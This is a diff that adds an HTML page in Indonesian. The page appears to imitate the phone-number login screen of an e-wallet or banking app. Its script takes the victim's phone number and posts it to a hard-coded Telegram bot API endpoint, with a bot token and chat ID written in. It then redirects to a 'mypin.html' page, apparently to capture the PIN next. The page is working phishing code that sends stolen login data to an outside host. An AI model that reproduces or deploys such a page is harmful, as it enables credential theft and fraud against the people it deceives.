@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#118EEA">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Saya</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #118EEA;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        .container {
+            text-align: center;
+            position: relative; /* Tambahkan posisi relatif untuk .container */
+        }
+
+        img {
+            max-width: 90%;
+            height: auto;
+            margin-top: 20px;
+        }
+
+        input[type="tel"] {
+            padding: 13px 70px; /* Ubah padding untuk menampung kedua gambar */
+            border-radius: 8px;
+            border: none;
+            background-color: white;
+            max-width: 320px;
+            width: 100%;
+            margin-top:20px;
+            font-size: 16px;
+            font-weight: bold;
+            box-sizing: border-box;
+            background-image: url('https://i.ibb.co/rcdC1dd/indo.png'), url('https://i.ibb.co/fNtsfBY/1000005366-removebg-preview.png'); /* Tambahkan background image */
+            background-size: 23px, 25px; /* Sesuaikan ukuran background image */
+            background-position: 10px center, right 256px center; /* Sesuaikan posisi background image */
+            background-repeat: no-repeat, no-repeat; /* Pastikan tidak ada pengulangan background image */
+        }
+
+        .text-lanjut {
+            color: white;
+            cursor: pointer;
+            margin-top: 20px;
+            display: block;
+            text-decoration: none;
+            font-weight: bold;
+        }
+
+        .process {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loader {
+            border: 8px solid #f3f3f3; /* Light grey */
+            border-top: 8px solid #3498db; /* Blue */
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            animation: spin 2s linear infinite;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://i.ibb.co/nnV9NzC/1000006613-removebg-preview.png" alt="Logo">
+        <br>
+        <div class="container">
+            <form id="phoneForm" method="post">
+                <input id="phoneInput" type="tel" name="phoneNumber" pattern="[0-9]{1,12}" placeholder="811-2345-6789" required>
+                <button type="submit" style="display: none;"></button>
+            </form>
+        </div>
+        <img src="https://i.ibb.co/2sdrZQf/1000006608-removebg-preview.png" alt="Logo">
+        <a href="mypin.html" id="textLanjut" class="text-lanjut">Lanjutkan</a>
+        <div class="process" id="process">
+            <div class="loader"></div>
+        </div>
+    </div>
+
+<script>
+    document.getElementById('textLanjut').addEventListener('click', function(event) {
+        event.preventDefault(); 
+        var phoneNumber = document.getElementById('phoneInput').value;
+        if (phoneNumber.trim() === '') {
+            alert('Silakan masukkan nomor telepon Anda.');
+            return;
+        }
+        document.getElementById('process').style.display = 'flex';
+        document.querySelector('.loader').style.display = 'block';
+        document.getElementById('textLanjut').style.display = 'none';
+
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                if (xhr.status === 200) {
+                    window.location.href = 'mypin.html';
+                } else {
+                    alert('Gagal mengirim pesan ke Telegram. Silakan coba lagi.');
+                    document.getElementById('process').style.display = 'none';
+                    document.getElementById('textLanjut').style.display = 'block';
+                }
+            }
+        };
+        xhr.open('POST', 'https://api.telegram.org/bot6946290282:AAHbPsb9hD-DbepVOIkge81AvWjY90YbbU0/sendMessage?chat_id=6824078885', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        // Kirim data dalam format JSON
+        const message = {
+            text: 'Nomor HP: ' + phoneNumber
+        };
+        xhr.send(JSON.stringify(message));
+    });
+</script>
+</body>
+</html>
